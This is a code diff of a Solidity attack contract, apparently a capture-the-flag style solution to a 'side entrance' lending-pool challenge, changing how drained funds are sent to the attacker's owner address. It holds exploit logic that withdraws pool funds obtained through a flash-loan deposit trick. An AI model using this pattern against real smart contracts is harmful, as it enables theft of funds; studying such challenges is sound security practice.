@@ -1,12 +1,12 @@
 import "../side-entrance/SideEntranceLenderPool.sol";
 
-import "../Ownable.sol";
-
-contract AttackSideEntrance is Ownable {
+contract AttackSideEntrance {
     SideEntranceLenderPool pool;
+    address payable owner;
 
     constructor(address _pool) {
         pool = SideEntranceLenderPool(_pool);
+        owner = payable(msg.sender);
     }
 
     function attack(uint256 amount) external {
@@ -15,7 +15,7 @@ contract AttackSideEntrance is Ownable {
         //we then withdraw it
         pool.withdraw();
         //and sent to money to the attack wallet
-        payable(msg.sender).transfer(address(this).balance);
+        owner.transfer(address(this).balance);
     }
 
     function execute() external payable {
